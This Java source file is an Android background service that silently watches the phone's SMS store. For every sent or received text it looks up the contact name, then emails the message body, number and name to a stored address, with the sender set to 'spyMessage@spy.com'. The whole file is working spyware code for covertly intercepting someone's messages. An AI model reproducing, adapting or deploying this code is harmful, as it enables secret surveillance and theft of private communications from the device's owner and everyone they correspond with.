package com.twoonefoursoft.messaging;


import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.util.Log;

public class Messaging extends Service {
	
	
	boolean receivedText, sentText = false;
	Handler handler = new Handler();
	String lastMsg = "";
	String incoming = "Received Message from ";
	String outgoing = "Sent Message to ";
	String contantName = "";
	String email = "";
	String message2 = "";
	String password = "";
	String number, message;
	boolean sendMsg = false;
	SharedPreferences prefs;
	
    /** Called when the activity is first created. */
    @Override
	public void onCreate() {
        super.onCreate();
        Log.v("My Tag 2", "In Oncreate");
        prefs = getSharedPreferences("EmailInfo", 0);
        email = prefs.getString("email", "");
        password = prefs.getString("password", "");
        sendMsg = prefs.getBoolean("send", false);
        number = prefs.getString("number", "");
        message = prefs.getString("msg", "");
        startmyService();
    }
    
    private void startmyService() {
    	
    	Log.v("Service", "In starService");
        Uri uri = Uri.parse("content://sms/"); 
        getContentResolver().registerContentObserver(uri, true, new MyContentObserver(handler)); 
    	
        
    }
    
class MyContentObserver extends ContentObserver { 
        
	public MyContentObserver(Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
	}
	
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Log.v("My Tag 1", "In Onchange");
		if (sendMsg)
			querySMS();
	}

	protected void querySMS() {
	    Uri uriSMS = Uri.parse("content://sms/");
	    Cursor cur = getContentResolver().query(uriSMS, null, null, null, null);
	    cur.moveToNext(); // this will make it point to the first record, which is the last SMS sent
	    String body = cur.getString(cur.getColumnIndex("body")); //content of sms
	    String add = cur.getString(cur.getColumnIndex("address")); //phone num
	    String time = cur.getString(cur.getColumnIndex("date")); //date
	    String protocol = cur.getString(cur.getColumnIndex("protocol")); //protocol
	    String contactName = getContactDisplayNameByNumber(add);
	    message2 = body.toLowerCase();
	    
	    
	    if (message.compareTo("") != 0) {
	    	if(add.compareTo(number)== 0 && message2.compareTo(message) == 0) {
	    		sendMsg = false;
	    		SharedPreferences.Editor editor = prefs.edit();
	    			editor.putBoolean("send", false);
	    	editor.commit();
	    	}
	    }
	    if (protocol == null) {
	    	Log.v("Outgoing Text", "This is in the protocol null");
	    	if (lastMsg.compareTo(body) != 0) {
	    		sentText = true;
	    		lastMsg = body;
	    	}
	    	
	    }
	    else  {
	    	Log.v("Incoming Text", "This is in the else");
	    	if (lastMsg.compareTo(body) != 0) {
	    		receivedText = true;
	    		lastMsg = body;
	    	}
	    }
	    
	    if (receivedText || sentText) {
	    	Log.v("Mail Part", "This is in the mailing part");
	    	Mail m = new Mail(email, password);
		      String[] toArr = {email };
		      
		      m.setTo(toArr);
		      m.setFrom("spyMessage@spy.com");
		      if(sentText){
		    	  m.setSubject(outgoing + contactName + " - " + add);
		      }
		      if(receivedText) {
		    	  m.setSubject(incoming + contactName + " - " + add);
		      }
		      m.setBody(body);
		      try {
					m.send();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		      receivedText = false;
		      sentText = false;
		      
	    }
	}
	
	public String getContactDisplayNameByNumber(String number) {
	    Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
	    String name = "?";

	    ContentResolver contentResolver = getContentResolver();
	    Cursor contactLookup = contentResolver.query(uri, new String[] {BaseColumns._ID,
	            ContactsContract.PhoneLookup.DISPLAY_NAME }, null, null, null);

	    try {
	        if (contactLookup != null && contactLookup.getCount() > 0) {
	            contactLookup.moveToNext();
	            name = contactLookup.getString(contactLookup.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
	            //String contactId = contactLookup.getString(contactLookup.getColumnIndex(BaseColumns._ID));
	        }
	    } finally {
	        if (contactLookup != null) {
	            contactLookup.close();
	        }
	    }

	    return name;
	}
}

@Override
public IBinder onBind(Intent intent) {
	// TODO Auto-generated method stub
	return null;
}
}